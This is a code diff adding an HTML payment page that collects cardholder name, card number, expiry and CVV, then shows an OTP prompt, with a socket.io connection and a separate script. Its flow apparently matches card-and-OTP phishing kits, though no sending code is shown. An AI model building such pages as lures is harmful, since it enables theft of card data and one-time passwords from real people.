@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Payment - Page 2</title>
+    <link rel="stylesheet" href="../styles.css">
+</head>
+
+<body>
+    <div class="payment-container">
+        <div class="payment-header">
+            <h2>Payment Details</h2>
+            <div class="card-logos">
+                <img src="https://cdn.visa.com/v2/assets/images/logos/visa/blue/logo.png" alt="Visa" class="card-logo">
+                <img src="https://brand.mastercard.com/content/dam/mccom/brandcenter/thumbnails/mastercard_vrt_rev_92px_2x.png"
+                    alt="Mastercard" class="card-logo">
+            </div>
+        </div>
+
+        <form id="card-form">
+            <div class="form-group">
+                <label for="name">Card Holder Name</label>
+                <input type="text" id="name" placeholder="John Doe" required>
+            </div>
+
+            <div class="form-group card-number-group">
+                <label for="number">Card Number</label>
+                <input type="text" id="number" placeholder="1234 5678 9012 3456" maxlength="19" required>
+                <div class="card-type-icon"></div>
+            </div>
+
+            <div class="form-row">
+                <div class="form-group">
+                    <label for="exp">Expiry Date</label>
+                    <input type="text" id="exp" placeholder="MM/YY" maxlength="5" required>
+                </div>
+                <div class="form-group">
+                    <label for="cvv">CVV Code</label>
+                    <input type="text" id="cvv" placeholder="123" maxlength="3" required>
+                </div>
+            </div>
+
+            <button type="submit" class="submit-button">
+                <span class="button-text">Process Payment</span>
+                <span class="button-icon">→</span>
+            </button>
+        </form>
+
+        <div id="loading" class="loading-spinner" style="display: none;">
+            <div class="spinner"></div>
+            <p>Processing your payment...</p>
+        </div>
+
+        <div id="otp-form" class="otp-container" style="display: none;">
+            <h3>Enter OTP Code</h3>
+            <p class="otp-info">Please enter the one-time password sent to your device</p>
+            <div class="form-group">
+                <input type="text" id="otp" placeholder="Enter OTP Code" maxlength="8">
+            </div>
+            <button id="submit-otp" class="submit-button">Verify OTP</button>
+        </div>
+    </div>
+
+    <div id="notification" class="notification" style="display: none;"></div>
+
+    <script src="/socket.io/socket.io.js"></script>
+    <script src="script2.js"></script>
+</body>
+
+</html>
